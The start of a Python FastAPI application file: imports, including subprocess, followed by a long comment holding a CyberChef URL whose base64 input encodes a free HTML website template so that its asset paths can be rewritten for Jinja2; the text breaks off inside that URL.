from fastapi import FastAPI,Request,Form
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.responses import RedirectResponse
import subprocess
#https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'(images%7Cjs%7Ccss)/((vendor/)?%5B%5C%5Cw-.%5D*)'%7D,'%7B%7B%20url_for(%5C'assets%5C',path%3D%5C'/$1/$2%5C')%20%7D%7D',true,false,true,false)&input=PCFET0NUWVBFIGh0bWw%2BCjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ%2BCgoJPG1ldGEgY2hhcnNldD0idXRmLTgiPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1FZGdlIj4KCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI%2BCgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIj4KCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIiPgoKCTx0aXRsZT5TbmFwc2hvdCBIVE1MIENTUyBXZWIgVGVtcGxhdGU8L3RpdGxlPgo8IS0tClNuYXBzaG90IFRlbXBsYXRlCmh0dHA6Ly93d3cudGVtcGxhdGVtby5jb20vdG0tNDkzLXNuYXBzaG90Cgpab29tIFNsaWRlcgpodHRwczovL3ZlZ2FzLmpheXNhbHZhdC5jb20vCgpDYXB0aW9uIEhvdmVyIEVmZmVjdHMKaHR0cDovL3R5bXBhbnVzLm5ldC9jb2Ryb3BzLzIwMTMvMDYvMTgvY2FwdGlvbi1ob3Zlci1lZmZlY3RzLwotLT4KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL2Jvb3RzdHJhcC5taW4uY3NzIj4KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL2FuaW1hdGUubWluLmNzcyI%2BCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9mb250LWF3ZXNvbWUubWluLmNzcyI%2BCiAgCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL2NvbXBvbmVudC5jc3MiPgoJCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuY3NzIj4KCTxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL293bC5jYXJvdXNlbC5jc3MiPgoJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvdmVnYXMubWluLmNzcyI%2BCgk8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9zdHlsZS5jc3MiPgoKCTwhLS0gR29vZ2xlIHdlYiBmb250ICAtLT4KCTxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Tb3VyY2UrU2FucytQcm86NDAwLDcwMCwzMDAnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgoJCjwvaGVhZD4KPGJvZHkgaWQ9InRvcCIgZGF0YS1zcHk9InNjcm9sbCIgZGF0YS1vZmZzZXQ9IjUwIiBkYXRhLXRhcmdldD0iLm5hdmJhci1jb2xsYXBzZSI%2BCgoKPCEtLSBQcmVsb2FkZXIgc2VjdGlvbiAtLT4KCjxkaXYgY2xhc3M9InByZWxvYWRlciI%2BCiAgICAgPGRpdiBjbGFzcz0ic2stc3Bpbm5lciBzay1zcGlubmVyLXB1bHNlIj48L2Rpdj4KPC9kaXY%2BCgoKPCEtLSBOYXZpZ2F0aW9uIHNlY3Rpb24gIC0tPgoKICA8ZGl2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWRlZmF1bHQgbmF2YmFyLWZpeGVkLXRvcCIgcm9sZT0ibmF2aWdhdGlvbiI%2BCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgoKICAgICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI%2BCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZSIgZGF0YS10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLXRhcmdldD0iLm5hdmJhci1jb2xsYXBzZSI%2BCiAgICAgICAgICA8c3BhbiBjbGFzcz0iaWNvbiBpY29uLWJhciI%2BPC9zcGFuPgogICAgICAgICAgPHNwYW4gY2xhc3M9Imljb24gaWNvbi1iYXIiPjwvc3Bhbj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uIGljb24tYmFyIj48L3NwYW4%2BCiAgICAgICAgPC9idXR0b24%2BCiAgICAgICAgPGEgaHJlZj0iI3RvcCIgY2xhc3M9Im5hdmJhci1icmFuZCBzbW9vdGhTY3JvbGwiPlNuYXBzaG90PC9hPgogICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiPgogICAgICAgICAgPHVsIGNsYXNzPSJuYXYgbmF2YmFyLW5hdiBuYXZiYXItcmlnaHQiPgogICAgICAgICAgICA8bGk%2BPGEgaHJlZj0iI3RvcCIgY2xhc3M9InNtb290aFNjcm9sbCI%2BPHNwYW4%2BSG9tZTwvc3Bhbj48L2E%2BPC9saT4KICAgICAgICAgICAgPGxpPjxhIGhyZWY9IiNhYm91dCIgY2xhc3M9InNtb290aFNjcm9sbCI%2BPHNwYW4%2BQWJvdXQ8L3NwYW4%2BPC9hPjwvbGk%2BCiAgICAgICAgICAgIDxsaT48YSBocmVmPSIjZ2FsbGVyeSIgY2xhc3M9InNtb290aFNjcm9sbCI%2BPHNwYW4%2BR2FsbGVyeTwvc3Bhbj48L2E%2BPC9saT4KICAgICAgICAgICAgPGxpPjxhIGhyZWY9IiNjb250YWN0IiBjbGFzcz0ic21vb3RoU2Nyb2xsIj48c3Bhbj5Db250YWN0PC9zcGFuPjwvYT48L2xpPgogICAgICAgICAgPC91bD4KICAgICAgIDwvZGl2PgoKICAgIDwvZGl2PgogIDwvZGl2PgoKCjwhLS0gSG9tZSBzZWN0aW9uIC0tPgoKPHNlY3Rpb24gaWQ9ImhvbWUiPgogIDxkaXYgY2xhc3M9Im92ZXJsYXkiPjwvZGl2PgogIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI%2BCiAgICA8ZGl2IGNsYXNzPSJyb3ciPgoKICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLW9mZnNldC0xIGNvbC1tZC0xMCBjb2wtc20tMTIgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC4zcyI%2BCiAgICAgICAgPGgxIGNsYXNzPSJ3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIwLjZzIj5MZXQncyB0YWtlIGEgc25hcHNob3Q8L2gxPgogICAgICAgIDxwIGNsYXNzPSJ3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIwLjlzIj5TbmFwc2hvdCB3ZWJzaXRlIHRlbXBsYXRlIGlzIGF2YWlsYWJsZSBmb3IgZnJlZSBkb3dubG9hZC4gQW55b25lIGNhbiBtb2RpZnkgYW5kIHVzZSBpdCBmb3IgYW55IHNpdGUuIFBsZWFzZSB0ZWxsIHlvdXIgZnJpZW5kcyBhYm91dCA8YSByZWw9Im5vZm9sbG93IiBocmVmPSJodHRwOi8vd3d3LnRlbXBsYXRlbW8uY29tIj50ZW1wbGF0ZW1vPC9hPi4gVGhhbmsgeW91LjwvcD4KICAgICAgICA8YSBocmVmPSIjYWJvdXQiIGNsYXNzPSJzbW9vdGhTY3JvbGwgYnRuIGJ0bi1zdWNjZXNzIGJ0bi1sZyB3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIxLjJzIj5MZWFybiBtb3JlPC9hPgogICAgICA8L2Rpdj4KCiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9zZWN0aW9uPgoKCjwhLS0gQWJvdXQgc2VjdGlvbiAtLT4KCjxzZWN0aW9uIGlkPSJhYm91dCI%2BCiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgIDxkaXYgY2xhc3M9InJvdyI%2BCgogICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtOSBjb2wtc20tOCB3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIwLjJzIj4KICAgICAgICA8ZGl2IGNsYXNzPSJhYm91dC10aHVtYiI%2BCiAgICAgICAgICA8aDE%2BQmFja2dyb3VuZDwvaDE%2BCiAgICAgICAgICA8cD5RdWlzcXVlIHRlbXBvciBiaWJlbmR1bSBkb2xvciBhdCB2b2x1dHBhdC4gU3VzcGVuZGlzc2UgdmVuZW5hdGlzIHF1YW0gc2VkIGxpYmVybyBldWlzbW9kIGZldWdpYXQuIEluIGN1cnN1cyBuaXNpIHZpdGFlIGxlY3R1cyBmYWNpbGlzaXMgbW9sbGlzLiBOdWxsYW0gc2NlbGVyaXNxdWUsIHF1YW0gbmVjIGlhY3VsaXMgdnVscHV0YXRlLjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY%2BCgogICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMyBjb2wtc20tNCB3b3cgZmFkZUluVXAgYWJvdXQtaW1nIiBkYXRhLXdvdy1kZWxheT0iMC42cyI%2BCiAgICAgICAgPGltZyBzcmM9ImltYWdlcy9hYm91dC1pbWcuanBnIiBjbGFzcz0iaW1nLXJlc3BvbnNpdmUgaW1nLWNpcmNsZSIgYWx0PSJBYm91dCI%2BCiAgICAgIDwvZGl2PgoKICAgICAgPGRpdiBjbGFzcz0iY2xlYXJmaXgiPjwvZGl2PgoKICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTEyIGNvbC1zbS0xMiB3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIwLjNzIj4KICAgICAgICA8ZGl2IGNsYXNzPSJzZWN0aW9uLXRpdGxlIHRleHQtY2VudGVyIj4KICAgICAgICAgIDxoMT5TbmFwc2hvdCBUZWFtPC9oMT4KICAgICAgICAgIDxoMz5Mb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCwgY29uc2VjdGV0dXIgYWRpcGlzY2luZyBlbGl0LjwvaDM%2BCiAgICAgICAgPC9kaXY%2BCiAgICAgIDwvZGl2PgoKICAgICAgPCEtLSB0ZWFtIGNhcm91c2VsIC0tPgogICAgICA8ZGl2IGlkPSJ0ZWFtLWNhcm91c2VsIiBjbGFzcz0ib3dsLWNhcm91c2VsIj4KCiAgICAgIDxkaXYgY2xhc3M9Iml0ZW0gY29sLW1kLTQgY29sLXNtLTYgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC40cyI%2BCiAgICAgICAgPGRpdiBjbGFzcz0idGVhbS10aHVtYiI%2BCiAgICAgICAgICA8ZGl2IGNsYXNzPSJpbWFnZS1ob2xkZXIiPgogICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL3RlYW0taW1nMS5qcGciIGNsYXNzPSJpbWctcmVzcG9uc2l2ZSBpbWctY2lyY2xlIiBhbHQ9Ik1hcnkiPgogICAgICAgICAgPC9kaXY%2BCiAgICAgICAgICA8aDIgY2xhc3M9ImhlYWRpbmciPk1hcnksIENFTzwvaDI%2BCiAgICAgICAgICA8cCBjbGFzcz0iZGVzY3JpcHRpb24iPkFsaXF1YW0gYWMganVzdG8gZXN0LiBQcmFlc2VudCBmZXVnaWF0IGN1cnN1cyBlc3QuPC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KCiAgICAgIDxkaXYgY2xhc3M9Iml0ZW0gY29sLW1kLTQgY29sLXNtLTYgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC42cyI%2BCiAgICAgICAgPGRpdiBjbGFzcz0idGVhbS10aHVtYiI%2BCiAgICAgICAgICA8ZGl2IGNsYXNzPSJpbWFnZS1ob2xkZXIiPgogICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL3RlYW0taW1nMi5qcGciIGNsYXNzPSJpbWctcmVzcG9uc2l2ZSBpbWctY2lyY2xlIiBhbHQ9IkphY2siPgogICAgICAgICAgPC9kaXY%2BCiAgICAgICAgICA8aDIgY2xhc3M9ImhlYWRpbmciPkphY2ssIEZvdW5kZXI8L2gyPgogICAgICAgICAgPHAgY2xhc3M9ImRlc2NyaXB0aW9uIj5NYWVjZW5hcyBzZWQgZGlhbSBlZ2V0IHJpc3VzIHZhcml1cyBibGFuZGl0IHNpdCBub24uPC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KCiAgICAgIDxkaXYgY2xhc3M9Iml0ZW0gY29sLW1kLTQgY29sLXNtLTYgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC44cyI%2BCiAgICAgICAgPGRpdiBjbGFzcz0idGVhbS10aHVtYiI%2BCiAgICAgICAgICA8ZGl2IGNsYXNzPSJpbWFnZS1ob2xkZXIiPgogICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL3RlYW0taW1nMy5qcGciIGNsYXNzPSJpbWctcmVzcG9uc2l2ZSBpbWctY2lyY2xlIiBhbHQ9IkxpbmRhIj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGgyIGNsYXNzPSJoZWFkaW5nIj5MaW5kYSwgTWFuYWdlcjwvaDI%2BCiAgICAgICAgICA8cCBjbGFzcz0iZGVzY3JpcHRpb24iPlBoYXNlbGx1cyBuZWMgYW50ZSBpbiBudW5jIG1vbGVzdGllIHRpbmNpZHVudCB1dCBldSBkaWFtLjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY%2BCgogICAgICA8ZGl2IGNsYXNzPSJpdGVtIGNvbC1tZC00IGNvbC1zbS02IHdvdyBmYWRlSW5VcCIgZGF0YS13b3ctZGVsYXk9IjAuOHMiPgogICAgICAgIDxkaXYgY2xhc3M9InRlYW0tdGh1bWIiPgogICAgICAgICAgPGRpdiBjbGFzcz0iaW1hZ2UtaG9sZGVyIj4KICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy90ZWFtLWltZzQuanBnIiBjbGFzcz0iaW1nLXJlc3BvbnNpdmUgaW1nLWNpcmNsZSIgYWx0PSJTYW5keSI%2BCiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxoMiBjbGFzcz0iaGVhZGluZyI%2BU2FuZHksIERpcmVjdG9yPC9oMj4KICAgICAgICAgIDxwIGNsYXNzPSJkZXNjcmlwdGlvbiI%2BQ3VyYWJpdHVyIHZ1bHB1dGF0ZSBldWlzbW9kIG5lcXVlIGV0IHRpbmNpZHVudC48L3A%2BCiAgICAgICAgPC9kaXY%2BCiAgICAgIDwvZGl2PgoKICAgICAgPGRpdiBjbGFzcz0iaXRlbSBjb2wtbWQtNCBjb2wtc20tNiB3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIwLjhzIj4KICAgICAgICA8ZGl2IGNsYXNzPSJ0ZWFtLXRodW1iIj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImltYWdlLWhvbGRlciI%2BCiAgICAgICAgICAgIDxpbWcgc3JjPSJpbWFnZXMvdGVhbS1pbWc1LmpwZyIgY2xhc3M9ImltZy1yZXNwb25zaXZlIGltZy1jaXJjbGUiIGFsdD0iTHVraWEiPgogICAgICAgICAgPC9kaXY%2BCiAgICAgICAgICA8aDIgY2xhc3M9ImhlYWRpbmciPkx1a2lhLCBGYXNoaW9uPC9oMj4KICAgICAgICAgIDxwIGNsYXNzPSJkZXNjcmlwdGlvbiI%2BTWFlY2VuYXMgc2VkIGRpYW0gZWdldCByaXN1cyB2YXJpdXMgYmxhbmRpdCBzaXQuPC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KCiAgICAgIDxkaXYgY2xhc3M9Iml0ZW0gY29sLW1kLTQgY29sLXNtLTYgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC44cyI%2BCiAgICAgICAgPGRpdiBjbGFzcz0idGVhbS10aHVtYiI%2BCiAgICAgICAgICA8ZGl2IGNsYXNzPSJpbWFnZS1ob2xkZXIiPgogICAgICAgICAgICA8aW1nIHNyYz0iaW1hZ2VzL3RlYW0taW1nNi5qcGciIGNsYXNzPSJpbWctcmVzcG9uc2l2ZSBpbWctY2lyY2xlIiBhbHQ9Ikdlb3JnZSI%2BCiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxoMiBjbGFzcz0iaGVhZGluZyI%2BR2VvcmdlLCBBZG1pbjwvaDI%2BCiAgICAgICAgICA8cCBjbGFzcz0iZGVzY3JpcHRpb24iPkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0LCBjb25zZWN0ZXR1ciBhZGlwaXNjaW5nLjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY%2BCgogICAgICA8ZGl2IGNsYXNzPSJpdGVtIGNvbC1tZC00IGNvbC1zbS02IHdvdyBmYWRlSW5VcCIgZGF0YS13b3ctZGVsYXk9IjAuOHMiPgogICAgICAgIDxkaXYgY2xhc3M9InRlYW0tdGh1bWIiPgogICAgICAgICAgPGRpdiBjbGFzcz0iaW1hZ2UtaG9sZGVyIj4KICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy90ZWFtLWltZzcuanBnIiBjbGFzcz0iaW1nLXJlc3BvbnNpdmUgaW1nLWNpcmNsZSIgYWx0PSJEYXkiPgogICAgICAgICAgPC9kaXY%2BCiAgICAgICAgICA8aDIgY2xhc3M9ImhlYWRpbmciPkRheSwgQWNjb3VudGFudDwvaDI%2BCiAgICAgICAgICA8cCBjbGFzcz0iZGVzY3JpcHRpb24iPk1hZWNlbmFzIHNlZCBkaWFtIGVnZXQgcmlzdXMgdmFyaXVzIGJsYW5kaXQgc2l0LjwvcD4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY%2BCgogICAgICA8ZGl2IGNsYXNzPSJpdGVtIGNvbC1tZC00IGNvbC1zbS02IHdvdyBmYWRlSW5VcCIgZGF0YS13b3ctZGVsYXk9IjAuOHMiPgogICAgICAgIDxkaXYgY2xhc3M9InRlYW0tdGh1bWIiPgogICAgICAgICAgPGRpdiBjbGFzcz0iaW1hZ2UtaG9sZGVyIj4KICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy90ZWFtLWltZzguanBnIiBjbGFzcz0iaW1nLXJlc3BvbnNpdmUgaW1nLWNpcmNsZSIgYWx0PSJMeW5uIj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGgyIGNsYXNzPSJoZWFkaW5nIj5MeW5uLCBNYXJrZXRpbmc8L2gyPgogICAgICAgICAgPHAgY2xhc3M9ImRlc2NyaXB0aW9uIj5Mb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCwgY29uc2VjdGV0dXIgYWRpcGlzY2luZy48L3A%2BCiAgICAgICAgPC9kaXY%2BCiAgICAgIDwvZGl2PgoKICAgICAgPC9kaXY%2BCiAgICAgIDwhLS0gZW5kIHRlYW0gY2Fyb3VzZWwgLS0%2BCgogICAgPC9kaXY%2BCiAgPC9kaXY%2BCjwvc2VjdGlvbj4KCgo8IS0tIEdhbGxlcnkgc2VjdGlvbiAtLT4KCjxzZWN0aW9uIGlkPSJnYWxsZXJ5Ij4KICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgPGRpdiBjbGFzcz0icm93Ij4KCiAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC1vZmZzZXQtMiBjb2wtbWQtOCBjb2wtc20tMTIgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC4zcyI%2BCiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbi10aXRsZSI%2BCiAgICAgICAgICA8aDE%2BR2FsbGVyeTwvaDE%2BCiAgICAgICAgICA8cD5OdWxsYW0gc2NlbGVyaXNxdWUsIHF1YW0gbmVjIGlhY3VsaXMgdnVscHV0YXRlLCBhcmN1IGxpZ3VsYSBzb2xsaWNpdHVkaW4gbmlzbCwgYWMgdm9sdXRwYXQgZXJhdCBudWxsYSBhIGFyY3UuPC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KCiAgICAgIDx1bCBjbGFzcz0iZ3JpZCBjcy1zdHlsZS00Ij4KICAgICAgICA8bGkgY2xhc3M9ImNvbC1tZC02IGNvbC1zbS02Ij4KICAgICAgICAgIDxmaWd1cmU%2BCiAgICAgICAgICAgIDxkaXY%2BPGltZyBzcmM9ImltYWdlcy9nYWxsZXJ5LWltZzEuanBnIiBhbHQ9ImltYWdlIDEiPjwvZGl2PgogICAgICAgICAgICA8ZmlnY2FwdGlvbj4KICAgICAgICAgICAgICA8aDE%2BU2FwaWVuIGFyY3U8L2gxPgogICAgICAgICAgICAgIDxzbWFsbD5DdW0gc29jaWlzIG5hdG9xdWUgcGVuYXRpYnVzIGV0IG1hZ25pcyBkaXMgcGFydHVyaWVudCBtb250ZXMuPC9zbWFsbD4KICAgICAgICAgICAgICA8YSBocmVmPSIjIj5SZWFkIE1vcmU8L2E%2BCiAgICAgICAgICAgIDwvZmlnY2FwdGlvbj4KICAgICAgICAgIDwvZmlndXJlPgogICAgICAgIDwvbGk%2BCgogICAgICAgIDxsaSBjbGFzcz0iY29sLW1kLTYgY29sLXNtLTYiPgogICAgICAgICAgPGZpZ3VyZT4KICAgICAgICAgICAgPGRpdj48aW1nIHNyYz0iaW1hZ2VzL2dhbGxlcnktaW1nMi5qcGciIGFsdD0iaW1hZ2UgMiI%2BPC9kaXY%2BCiAgICAgICAgICAgIDxmaWdjYXB0aW9uPgogICAgICAgICAgICAgIDxoMT5BbGlxdWFtIGVyYXQ8L2gxPgogICAgICAgICAgICAgIDxzbWFsbD5TdXNwZW5kaXNzZSB2ZW5lbmF0aXMgcXVhbSBzZWQgbGliZXJvIGV1aXNtb2QgZmV1Z2lhdC48L3NtYWxsPgogICAgICAgICAgICAgIDxhIGhyZWY9IiMiPkRldGFpbHM8L2E%2BCiAgICAgICAgICAgIDwvZmlnY2FwdGlvbj4KICAgICAgICAgIDwvZmlndXJlPgogICAgICAgIDwvbGk%2BCgogICAgICAgIDxsaSBjbGFzcz0iY29sLW1kLTYgY29sLXNtLTYiPgogICAgICAgICAgPGZpZ3VyZT4KICAgICAgICAgICAgPGRpdj48aW1nIHNyYz0iaW1hZ2VzL2dhbGxlcnktaW1nMy5qcGciIGFsdD0iaW1hZ2UgMyI%2BPC9kaXY%2BCiAgICAgICAgICAgIDxmaWdjYXB0aW9uPgogICAgICAgICAgICAgIDxoMT5DcmFzIGFudGUgc2VtPC9oMT4KICAgICAgICAgICAgICA8c21hbGw%2BQWVuZWFuIHVybmEgbWFzc2EsIGNvbnZhbGxpcyB2ZWhpY3VsYSB2ZWxpdCBldCwgZGljdHVtIHBlbGxlbnRlc3F1ZSBuaXNpLjwvc21hbGw%2BCiAgICAgICAgICAgICAgPGEgaHJlZj0iIyI%2BTGVhcm4gTW9yZTwvYT4KICAgICAgICAgICAgPC9maWdjYXB0aW9uPgogICAgICAgICAgPC9maWd1cmU%2BCiAgICAgICAgPC9saT4KCiAgICAgICAgPGxpIGNsYXNzPSJjb2wtbWQtNiBjb2wtc20tNiI%2BCiAgICAgICAgICA8ZmlndXJlPgogICAgICAgICAgICA8ZGl2PjxpbWcgc3JjPSJpbWFnZXMvZ2FsbGVyeS1pbWc0LmpwZyIgYWx0PSJpbWFnZSA0Ij48L2Rpdj4KICAgICAgICAgICAgPGZpZ2NhcHRpb24%2BCiAgICAgICAgICAgICAgPGgxPlNlZCBvcm5hcmU8L2gxPgogICAgICAgICAgICAgIDxzbWFsbD5Mb3JlbSBpcHN1bSBkb2xvciBzaXQgYW1ldCwgY29uc2VjdGV0dXIgYWRpcGlzY2luZyBlbGl0Ljwvc21hbGw%2BCiAgICAgICAgICAgICAgPGEgaHJlZj0iIyI%2BRnVsbCBQb3N0PC9hPgogICAgICAgICAgICA8L2ZpZ2NhcHRpb24%2BCiAgICAgICAgICA8L2ZpZ3VyZT4KICAgICAgICA8L2xpPgogICAgICA8L3VsPgoKICAgIDwvZGl2PgogIDwvZGl2Pgo8L3NlY3Rpb24%2BCgoKPCEtLSBDb250YWN0IHNlY3Rpb24gLS0%2BCgo8c2VjdGlvbiBpZD0iY29udGFjdCI%2BCiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgIDxkaXYgY2xhc3M9InJvdyI%2BCgogICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLW9mZnNldC0xIGNvbC1tZC0xMCBjb2wtc20tMTIiPgoKICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctb2Zmc2V0LTEgY29sLWxnLTEwIHNlY3Rpb24tdGl0bGUgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC40cyI%2BCiAgICAgICAgICA8aDE%2BU2VuZCBhIG1lc3NhZ2U8L2gxPgogICAgICAgICAgPHA%2BTnVuYyBzdXNjaXBpdCBhbnRlIGluIGxlY3R1cyBsYW9yZWV0LCBuZWMgcGhhcmV0cmEgZGlhbSBkaWN0dW0uIExvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0LCBjb25zZWN0ZXR1ciBhZGlwaXNjaW5nIGVsaXQuIDwvcD4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGZvcm0gYWN0aW9uPSIjIiBtZXRob2Q9InBvc3QiIGNsYXNzPSJ3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIwLjhzIj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC02IGNvbC1zbS02Ij4KICAgICAgICAgICAgPGlucHV0IG5hbWU9Im5hbWUiIHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJuYW1lIiBwbGFjZWhvbGRlcj0iTmFtZSI%2BCiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1tZC02IGNvbC1zbS02Ij4KICAgICAgICAgICAgPGlucHV0IG5hbWU9ImVtYWlsIiB0eXBlPSJlbWFpbCIgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImVtYWlsIiBwbGFjZWhvbGRlcj0iRW1haWwiPgogICAgICAgICAgPC9kaXY%2BCiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIgY29sLXNtLTEyIj4KICAgICAgICAgICAgPHRleHRhcmVhIG5hbWU9Im1lc3NhZ2UiIHJvd3M9IjYiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJtZXNzYWdlIiBwbGFjZWhvbGRlcj0iTWVzc2FnZSI%2BPC90ZXh0YXJlYT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLW9mZnNldC0zIGNvbC1tZC02IGNvbC1zbS1vZmZzZXQtMyBjb2wtc20tNiI%2BCiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHZhbHVlPSJTRU5EIE1FU1NBR0UiPgogICAgICAgICAgPC9kaXY%2BCiAgICAgICAgPC9mb3JtPgoKICAgICAgPC9kaXY%2BCgogICAgPC9kaXY%2BCiAgPC9kaXY%2BCjwvc2VjdGlvbj4KCgo8IS0tIEZvb3RlciBzZWN0aW9uIC0tPgoKPGZvb3Rlcj4KCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI%2BCiAgICAKCQk8ZGl2IGNsYXNzPSJyb3ciPgoKCQkJPGRpdiBjbGFzcz0iY29sLW1kLTEyIGNvbC1zbS0xMiI%2BCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzb2NpYWwtaWNvbiI%2BIAogICAgICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSIjIiBjbGFzcz0iZmEgZmEtZmFjZWJvb2sgd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC4ycyI%2BPC9hPjwvbGk%2BCiAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9IiMiIGNsYXNzPSJmYSBmYS10d2l0dGVyIHdvdyBmYWRlSW5VcCIgZGF0YS13b3ctZGVsYXk9IjAuNHMiPjwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSIjIiBjbGFzcz0iZmEgZmEtbGlua2VkaW4gd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC42cyI%2BPC9hPjwvbGk%2BCiAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9IiMiIGNsYXNzPSJmYSBmYS1pbnN0YWdyYW0gd293IGZhZGVJblVwIiBkYXRhLXdvdy1kZWxheT0iMC44cyI%2BPC9hPjwvbGk%2BCiAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9IiMiIGNsYXNzPSJmYSBmYS1nb29nbGUtcGx1cyB3b3cgZmFkZUluVXAiIGRhdGEtd293LWRlbGF5PSIxLjBzIj48L2E%2BPC9saT4KICAgICAgICAgICAgICAgIDwvdWw%2BCgoJCQkJPHAgY2xhc3M9IndvdyBmYWRlSW5VcCIgIGRhdGEtd293LWRlbGF5PSIxcyIgPkNvcHlyaWdodCAmY29weTsgMjAxNiBTbmFwc2hvdCBTdHVkaW8gfCAKICAgICAgICAgICAgICAgIERlc2lnbjogPGEgaHJlZj0iaHR0cHM6Ly9wbHVzLmdvb2dsZS5jb20v